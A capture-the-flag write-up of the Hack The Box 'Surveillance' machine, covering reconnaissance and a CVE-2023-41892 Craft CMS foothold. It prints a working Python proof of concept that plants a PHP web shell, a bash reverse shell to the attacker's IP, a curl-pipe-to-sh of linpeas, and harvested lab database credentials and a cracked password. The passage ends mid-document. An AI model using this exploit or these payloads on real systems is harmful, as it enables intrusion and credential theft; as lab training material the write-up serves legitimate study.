# Surveillance

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -sC -sV 10.129.230.42
[sudo] password for user: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-09 19:01 UTC
Nmap scan report for 10.129.230.42
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx/1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT        ADDRESS
1   50.48 ms   10.10.16.1
2   ... 10
11  2207.02 ms 10.10.16.1
12  2505.59 ms 10.10.16.1
13  ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.02 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -sC -sV -p- 10.129.230.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-09 19:02 UTC
Nmap scan report for 10.129.230.42
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/9%OT=22%CT=1%CU=37523%PV=Y%DS=2%DC=T%G=Y%TM=6574
OS:B9F2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI
OS:=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST
OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=
OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   43.19 ms 10.10.16.1
2   63.24 ms 10.129.230.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.10 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.230.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-09 19:03 UTC
Nmap scan report for surveillance.htb (10.129.230.42)
Host is up (0.054s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1144.20 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.230.42/

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.129.230.42   surveillance.htb
```

> http://surveillance.htb/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://surveillance.htb/
http://surveillance.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.42], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

> view-source:http://surveillance.htb/

```c
  <!-- footer section -->
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
  <!-- footer section -->
```

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://surveillance.htb/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_surveillance.htb/__23-12-09_19-52-16.txt

Target: http://surveillance.htb/

[19:52:16] Starting: 
[19:52:21] 301 -  178B  - /js  ->  http://surveillance.htb/js/              
[19:53:48] 200 -    0B  - /.gitkeep                                         
[19:53:59] 200 -  304B  - /.htaccess                                        
[19:58:25] 302 -    0B  - /admin  ->  http://surveillance.htb/admin/login   
[19:58:45] 302 -    0B  - /admin/  ->  http://surveillance.htb/admin/login  
[19:58:48] 404 -   27KB - /admin/_logs/access-log                           
[19:58:48] 302 -    0B  - /admin/admin  ->  http://surveillance.htb/admin/login
[19:58:49] 404 -   27KB - /admin/_logs/err.log
[19:58:49] 404 -   27KB - /admin/_logs/error-log
[19:58:49] 404 -   27KB - /admin/.config
[19:58:49] 404 -   27KB - /admin/_logs/login.txt
[19:58:50] 404 -   27KB - /admin/_logs/access_log
[19:58:50] 404 -   27KB - /admin/_logs/access.log
[19:58:50] 404 -   27KB - /admin/_logs/error_log
[19:58:51] 404 -   27KB - /admin/_logs/error.log
[19:58:51] 404 -   27KB - /admin/access_log
[19:58:51] 404 -   27KB - /admin/.htaccess
[19:58:51] 404 -   27KB - /admin/access.log
[19:58:52] 404 -   27KB - /admin/access.txt
[19:58:52] 404 -   27KB - /admin/account
[19:58:52] 404 -   27KB - /admin/%3bindex/
[19:58:53] 200 -   38KB - /admin/admin/login
[19:58:53] 404 -   27KB - /admin/admin-login
[19:58:56] 404 -   27KB - /admin/admin-login.php
[19:58:57] 404 -   27KB - /admin/account.html
[19:58:57] 404 -   27KB - /admin/account.php
[19:58:57] 404 -   27KB - /admin/account.jsp
[19:58:57] 404 -   27KB - /admin/account.aspx
[19:58:59] 404 -   27KB - /admin/adminLogin
[19:58:59] 404 -   27KB - /admin/admin-login.aspx
[19:58:59] 404 -   27KB - /admin/account.js
[19:58:59] 404 -   27KB - /admin/admin-login.js
[19:59:00] 404 -   27KB - /admin/admin-login.jsp
[19:58:59] 404 -   27KB - /admin/admin_login
[19:59:01] 404 -   27KB - /admin/admin.php
[19:59:01] 404 -   27KB - /admin/admin-login.html
[19:59:02] 404 -   27KB - /admin/admin.jsp
[19:59:03] 404 -   27KB - /admin/admin.html
[19:59:03] 404 -   27KB - /admin/admin_login.php
[19:59:04] 404 -   27KB - /admin/admin.js
[19:59:05] 404 -   27KB - /admin/adminLogin.aspx
[19:59:05] 404 -   27KB - /admin/controlpanel
[19:59:05] 404 -   27KB - /admin/adminLogin.php
[19:59:06] 404 -   27KB - /admin/admin_login.jsp
[19:59:05] 404 -   27KB - /admin/adminer.php
[19:59:05] 404 -   27KB - /admin/admin_login.js
[19:59:06] 404 -   27KB - /admin/admin.aspx
[19:59:06] 404 -   27KB - /admin/admin_login.aspx
[19:59:07] 404 -   27KB - /admin/adminLogin.jsp
[19:59:06] 404 -   27KB - /admin/admin_login.html
[19:59:08] 404 -   27KB - /admin/backup/
[19:59:08] 404 -   27KB - /admin/adminLogin.html
[19:59:09] 404 -   27KB - /admin/adminLogin.js
[19:59:09] 404 -   27KB - /admin/controlpanel.aspx
[19:59:08] 404 -   27KB - /admin/backups/
[19:59:10] 404 -   27KB - /admin/controlpanel.php
[19:59:10] 404 -   27KB - /admin/cp.php
[19:59:11] 404 -   27KB - /admin/config.php
[19:59:11] 404 -   27KB - /admin/controlpanel.js
[19:59:12] 404 -   27KB - /admin/controlpanel.html
[19:59:10] 404 -   27KB - /admin/cp.aspx
[19:59:12] 404 -   27KB - /admin/default/admin.asp
[19:59:12] 404 -   27KB - /admin/controlpanel.jsp
[19:59:13] 404 -   27KB - /admin/data/autosuggest
[19:59:13] 404 -   27KB - /admin/default
[19:59:13] 404 -   27KB - /admin/default.asp
[19:59:13] 404 -   27KB - /admin/cp.html
[19:59:13] 404 -   27KB - /admin/error_log
[19:59:13] 404 -   27KB - /admin/default/login.asp
[19:59:13] 404 -   27KB - /admin/cp.jsp
[19:59:14] 404 -   27KB - /admin/error.log
[19:59:15] 404 -   27KB - /admin/db/
[19:59:15] 404 -   27KB - /admin/cp.js
[19:59:08] 404 -   27KB - /admin/cp
[19:59:15] 404 -   27KB - /admin/FCKeditor
[19:59:15] 404 -   27KB - /admin/errors.log
[19:59:16] 404 -   27KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[19:59:17] 404 -   27KB - /admin/dumper/
[19:59:18] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[19:59:18] 404 -   27KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[19:59:15] 404 -   27KB - /admin/error.txt
[19:59:16] 404 -   27KB - /admin/download.php
[19:59:17] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[19:59:20] 404 -   27KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[19:59:21] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
[19:59:21] 404 -   27KB - /admin/heapdump
[19:59:21] 302 -    0B  - /admin/index  ->  http://surveillance.htb/admin/login
[19:59:21] 404 -   27KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[19:59:21] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
[19:59:21] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[19:59:19] 404 -   27KB - /admin/export.php
[19:59:22] 404 -   27KB - /admin/home
[19:59:23] 404 -   27KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
[19:59:24] 404 -   27KB - /admin/files.php
[19:59:26] 200 -   38KB - /admin/login
[19:59:26] 404 -   27KB - /admin/includes/configure.php~
[19:59:26] 404 -   27KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[19:59:27] 404 -   27KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[19:59:27] 404 -   27KB - /admin/js/tiny_mce
[19:59:28] 404 -   27KB - /admin/file.php
[19:59:29] 404 -   27KB - /admin/home.html
[19:59:30] 404 -   27KB - /admin/home.php                                   
[19:59:30] 404 -   27KB - /admin/home.aspx
[19:59:30] 404 -   27KB - /admin/home.jsp
[19:59:31] 404 -   27KB - /admin/log/error.log
[19:59:31] 404 -   27KB - /admin/index.php
[19:59:31] 404 -   27KB - /admin/index.aspx
[19:59:32] 404 -   27KB - /admin/js/tinymce
[19:59:32] 404 -   27KB - /admin/index.js
[19:59:32] 404 -   27KB - /admin/index.html
[19:59:32] 404 -   27KB - /admin/home.js
[19:59:33] 404 -   27KB - /admin/login.htm
[19:59:32] 404 -   27KB - /admin/log
[19:59:34] 404 -   27KB - /admin/login.aspx
[19:59:34] 404 -   27KB - /admin/login.asp
[19:59:34] 404 -   27KB - /admin/login.do
[19:59:33] 404 -   27KB - /admin/index.jsp
[19:59:34] 404 -   27KB - /admin/js/tiny_mce/
[19:59:35] 404 -   27KB - /admin/login.py
[19:59:36] 404 -   27KB - /admin/login.js                                   
[19:59:35] 404 -   27KB - /admin/login.rb
[19:59:36] 404 -   27KB - /admin/logs/access.log
[19:59:36] 404 -   27KB - /admin/js/tinymce/
[19:59:36] 404 -   27KB - /admin/login.jsp
[19:59:36] 404 -   27KB - /admin/login.html
[19:59:37] 404 -   27KB - /admin/logs/access_log
[19:59:36] 404 -   27KB - /admin/logs/
[19:59:38] 404 -   27KB - /admin/logs/err.log
[19:59:39] 404 -   27KB - /admin/logs/error.log
[19:59:38] 404 -   27KB - /admin/logs/error_log
[19:59:39] 404 -   27KB - /admin/logs/errors.log
[19:59:36] 404 -   27KB - /admin/logs/access-log
[19:59:38] 404 -   27KB - /admin/login.php
[19:59:39] 404 -   27KB - /admin/logon.jsp
[19:59:40] 404 -   27KB - /admin/manage/login.asp
[19:59:39] 404 -   27KB - /admin/logs/login.txt
[19:59:39] 404 -   27KB - /admin/logs/error-log
[19:59:40] 404 -   27KB - /admin/manage
[19:59:41] 404 -   27KB - /admin/manage/admin.asp
[19:59:42] 404 -   27KB - /admin/manage.asp
[19:59:43] 404 -   27KB - /admin/phpMyAdmin
[19:59:46] 404 -   27KB - /admin/mysql/
[19:59:46] 404 -   27KB - /admin/pol_log.txt
[19:59:46] 404 -   27KB - /admin/mysql2/index.php
[19:59:47] 404 -   27KB - /admin/PMA/index.php
[19:59:47] 404 -   27KB - /admin/phpmyadmin/
[19:59:47] 404 -   27KB - /admin/phpMyAdmin/index.php
[19:59:47] 404 -   27KB - /admin/private/logs
[19:59:47] 404 -   27KB - /admin/phpmyadmin2/index.php
[19:59:48] 404 -   27KB - /admin/scripts/fckeditor
[19:59:48] 404 -   27KB - /admin/phpMyAdmin/
[19:59:48] 404 -   27KB - /admin/pMA/
[19:59:49] 404 -   27KB - /admin/signin
[19:59:49] 404 -   27KB - /admin/tiny_mce
[19:59:48] 404 -   27KB - /admin/release
[19:59:49] 404 -   27KB - /admin/phpmyadmin/index.php
[19:59:49] 404 -   27KB - /admin/pma/
[19:59:50] 404 -   27KB - /admin/secure/logon.jsp
[19:59:47] 404 -   27KB - /admin/mysql/index.php
[19:59:49] 404 -   27KB - /admin/tinymce
[19:59:50] 404 -   27KB - /admin/upload.php
[19:59:50] 404 -   27KB - /admin/user_count.txt
[19:59:49] 404 -   27KB - /admin/pma/index.php
[19:59:50] 404 -   27KB - /admin/portalcollect.php?f=http://xxx&t=js
[19:59:51] 404 -   27KB - /admin/sysadmin/
[19:59:51] 404 -   27KB - /admin/sqladmin/
[19:59:50] 404 -   27KB - /admin/sxd/
[19:59:52] 404 -   27KB - /admin/uploads.php                                
[19:59:53] 404 -   27KB - /admin/views/ajax/autocomplete/user/a             
[19:59:55] 404 -   27KB - /admin/web/                                       
[20:07:21] 301 -  178B  - /css  ->  http://surveillance.htb/css/            
[20:09:44] 301 -  178B  - /fonts  ->  http://surveillance.htb/fonts/        
[20:11:03] 301 -  178B  - /images  ->  http://surveillance.htb/images/      
[20:11:03] 403 -  564B  - /images/                                          
[20:11:05] 301 -  178B  - /img  ->  http://surveillance.htb/img/            
[20:11:16] 200 -    1B  - /index                                            
[20:11:20] 200 -    1B  - /index.php.                                       
[20:12:01] 403 -  564B  - /js/                                              
[20:13:04] 302 -    0B  - /logout  ->  http://surveillance.htb/             
[20:13:06] 302 -    0B  - /logout/  ->  http://surveillance.htb/            
[20:23:04] 200 -    1KB - /web.config                                       
[20:23:30] 418 -   24KB - /wp-admin/                                        
[20:23:30] 418 -   24KB - /wp-admin                                         
                                                                             
Task Completed
```

```c
┌──(user㉿kali)-[~/Downloads]
└─$ curl http://surveillance.htb/.htaccess
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Send would-be 404 requests to Craft
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_URI} !^/(favicon\.ico|apple-touch-icon.*\.png)$ [NC]
    RewriteRule (.+) index.php?p=$1 [QSA,L]
</IfModule>
```

## Foothold via CVE-2023-41892

> https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/

Modified Request:

```c
GET /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Cookie: CRAFT_CSRF_TOKEN=f423adc5acb1d8812f8717cf14a37e1ce41b921066430b9c872e9080b4628643a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22IAwC46yUWd43emt5DCSbeq8dJv9Bi076KI7-OATH%22%3B%7D; CraftSessionId=1demns87s8u9imcab7b76e81c4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 234

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```

We forwarded it and got a fullz rendered `phpinfo` page.

```c
USER 	www-data
HOME 	/var/www
CRAFT_APP_ID 	CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
CRAFT_ENVIRONMENT 	production
CRAFT_SECURITY_KEY 	2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
CRAFT_DB_DRIVER 	mysql
CRAFT_DB_SERVER 	127.0.0.1
CRAFT_DB_PORT 	3306
CRAFT_DB_DATABASE 	craftdb
CRAFT_DB_USER 	craftuser
CRAFT_DB_PASSWORD 	CraftCMSPassword2023!
CRAFT_DB_SCHEMA 	no value
CRAFT_DB_TABLE_PREFIX 	no value
DEV_MODE 	false
ALLOW_ADMIN_CHANGES 	false
DISALLOW_ROBOTS 	false
PRIMARY_SITE_URL 	http://surveillance.htb/ 
```

> https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce

> https://gist.githubusercontent.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce/raw/ef75fd7287da4ea7c86e9533d8eb768bde3b93c0/CVE-2023-41892-POC.md

Modified POC:

```c
┌──(user㉿kali)-[/media/…/htb/machines/surveillance/files]
└─$ cat poc.py 
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp"
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/surveillance/files]
└─$ python poc.py http://surveillance.htb/index.php
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
```

Payload:

```c
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261%27
```

> http://surveillance.htb/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261%27

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.230.42] 52566
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$
```

## Stabilizing Shell

```c
www-data@surveillance:~/html/craft/web$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@surveillance:~/html$ ^Z
zsh: suspended  nc -lnvp 443
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 443

www-data@surveillance:~/html/craft/web$ 
www-data@surveillance:~/html/craft/web$ export XTERM=xterm
www-data@surveillance:~/html/craft/web$
```

## Enumeration

```c
www-data@surveillance:~/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
fwupd-refresh:x:115:123:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```c
www-data@surveillance:/etc/nginx/sites-available$ cat zoneminder.conf 
server {
    listen 127.0.0.1:8080;
    
    root /usr/share/zoneminder/www;
    
    index index.php;
    
    access_log /var/log/zm/access.log;
    error_log /var/log/zm/error.log;
    
    location / {
        try_files $uri $uri/ /index.php?$args =404;
       
        location ~ /api/(css|img|ico) {
            rewrite ^/api(.+)$ /api/app/webroot/$1 break;
            try_files $uri $uri/ =404;
        }

        location /api {
            rewrite ^/api(.+)$ /api/app/webroot/index.php?p=$1 last;
        }

        location /cgi-bin {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_pass unix:/run/fcgiwrap.sock;
        }
        
        location ~ \.php$ {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_index index.php;
            
            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock;
        }
    }
}
```

## Further Enumeration with LinPEAS

```c
www-data@surveillance:/dev/shm$ curl http://10.10.16.13/linpeas.sh | sh
```

```c
-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
                'password' => ZM_DB_PASS,
                'database' => ZM_DB_NAME,
                'host' => 'localhost',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
                                $this->default['host'] = $array[0];
                        $this->default['host'] = ZM_DB_HOST;
-rw-r--r-- 1 root zoneminder 11257 Nov 18  2022 /usr/share/zoneminder/www/includes/database.php
```

```c
www-data@surveillance:/dev/shm$ cat /usr/share/zoneminder/www/api/app/Config/database.php
<--- SNIP --->
defaultclass DATABASE_CONFIG {

        /*public $default = array(
                'datasource' => 'Database/Mysql',
                'persistent' => false,
                'login' => ZM_DB_USER,
                'password' => ZM_DB_PASS,
                'database' => ZM_DB_NAME,
                'ssl_ca' => ZM_DB_SSL_CA_CERT,
                'ssl_key' => ZM_DB_SSL_CLIENT_KEY,
                'ssl_cert' => ZM_DB_SSL_CLIENT_CERT,
                'prefix' => '',
                'encoding' => 'utf8',
        );*/

        public $test = array(
                'datasource' => 'Database/Mysql',
                'persistent' => false,
                'host' => 'localhost',
                'login' => 'zmuser',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
                'prefix' => '',
                //'encoding' => 'utf8',
        );

        public function __construct() {
                if (strpos(ZM_DB_HOST, ':')):
                        $array = explode(':', ZM_DB_HOST, 2);
                        if (ctype_digit($array[1])):
                                $this->default['host'] = $array[0];
                                $this->default['port'] = $array[1];
                        else:
                                $this->default['unix_socket'] = $array[1];
                        endif;
                else:
                        $this->default['host'] = ZM_DB_HOST;
                endif;
        }
}
```

| Username | Password |
| --- | --- |
| zmuser | ZoneMinderPassword2023 |

## Privilege Escalation to matthew

```c
www-data@surveillance:~/html/craft/storage/backups$ ls -la
total 28
drwxrwxr-x 2 www-data www-data  4096 Oct 17 20:33 .
drwxr-xr-x 6 www-data www-data  4096 Oct 11 20:12 ..
-rw-r--r-- 1 root     root     19918 Oct 17 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

```c
www-data@surveillance:~/html/craft/storage/backups$ grep Matthew surveillance--2023-10-17-202801--v4.4.14.sql
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

> https://crackstation.net/

| Username | Password |
| --- | --- |
| matthew | starcraft122490 |

```c
┌──(user㉿kali)-[~]
